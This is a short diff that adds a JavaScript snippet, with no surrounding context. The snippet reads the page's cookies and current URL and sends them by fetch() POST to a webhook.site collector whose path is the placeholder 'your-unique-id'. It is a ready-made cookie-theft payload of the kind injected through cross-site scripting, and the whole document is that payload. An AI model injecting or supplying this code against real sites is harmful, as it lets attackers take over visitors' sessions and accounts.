@@ -1,0 +1,4 @@
+fetch("https://webhook.site/your-unique-id", {
+  method: "POST",
+  body: `cookie=${document.cookie}&location=${location.href}`
+});
